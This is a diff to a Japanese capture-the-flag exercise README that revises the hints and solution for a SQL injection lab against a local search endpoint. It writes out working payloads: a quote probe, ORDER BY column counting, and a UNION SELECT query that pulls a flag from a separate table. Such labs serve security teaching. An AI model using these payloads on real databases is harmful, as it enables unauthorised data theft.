@@ -2,48 +2,49 @@
 
 `http://localhost:3002` の商品検索から、DB内のflagを抜き出せ。
 
-このDBには`flags`テーブルがあり、`flag`カラムにflagが1件入っている
-(`products`テーブルとは無関係)。目標は「UNION SELECTでこの値を検索結果に混ぜ込む」こと。
+このDBのテーブル構成:
+- `products(id, name, description, price)` — 検索対象、4カラム
+- `flags(id, flag)` — 無関係の別テーブル。目標はこの`flag`を検索結果に混ぜ込むこと
 
 ## ヒント
 
 <details><summary>ヒント1</summary>
 
-`?q=`の値をそのままLIKE句に埋め込んでいる(`server.py`参照)。エラーはそのままJSONで返る
-= 構文ミスの手がかりが丸見え。
+`?q=`の値をそのままLIKE句に埋め込んでいる(`server.py`参照)。エラーはそのままJSONで返る。
 
 </details>
 
 <details><summary>ヒント2</summary>
 
-`q=test' ORDER BY 5-- -` のように末尾のカラム数を変えて試すと、存在しないカラム番号で
-エラーが出る。これでSELECTしているカラム数がわかる。
+まず`'`(シングルクォート)1つだけ送ってみろ。SQL構文エラーが返るはずだ。クォートを閉じずに
+残りの構文を自分で足せる状態になっている。
 
 </details>
 
 <details><summary>ヒント3</summary>
 
-カラム数がわかったら`UNION SELECT`で`flags.flag`を検索結果に混ぜ込める。型が違うカラムには
-`NULL`を入れれば型エラーを回避できる。
+`products`は4カラムなので、`UNION SELECT`も4つの値を返す必要がある。型が違うカラムには
+`NULL`を入れれば型エラーを回避できる(例: `UNION SELECT 1,'a','b',1`)。
 
 </details>
 
 <details><summary>解答</summary>
 
-1. カラム数特定:
-   ```
-   q=zzz' ORDER BY 4-- -
-   ```
-   (5にするとエラーになる → 4カラム)
+```
+q=zzz' UNION SELECT id,flag,NULL,NULL FROM flags-- -
+```
 
-2. UNION成立確認:
-   ```
-   q=zzz' UNION SELECT 1,'a','b',1-- -
-   ```
+`zzz`で本来の検索を空振りさせ、`UNION SELECT`で`flags`テーブルの値を同じ4カラムの形で
+結果に混ぜ込んでいる。`id,flag`は`products`の`id,name`と型が合うのでそのまま、残り2つは
+`NULL`で埋めている。
 
-3. flag抽出:
-   ```
-   q=zzz' UNION SELECT id,flag,NULL,NULL FROM flags-- -
-   ```
+### もっと自力で探したい場合
+
+カラム数(4)を教えられずに解く場合は`ORDER BY`で探る:
+```
+q=zzz' ORDER BY 4-- -   -> 通る
+q=zzz' ORDER BY 5-- -   -> エラー(5カラム目は存在しない)
+```
+これでSELECT対象のカラム数を特定できる。
 
 </details>
